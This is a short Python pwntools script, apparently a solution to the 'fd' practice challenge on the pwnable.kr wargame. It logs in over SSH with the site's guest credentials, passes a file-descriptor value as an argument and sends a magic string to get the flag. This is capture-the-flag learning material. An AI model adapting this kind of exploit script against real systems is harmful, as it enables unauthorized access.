from pwn import *

fd_stdin=0

s = ssh(host='pwnable.kr',
        port=2222,
        user='fd',
        password='guest')

sh = s.process(argv=['fd',str(fd_stdin+0x1234)])
sh.sendline('LETMEWIN')
print sh.recvall()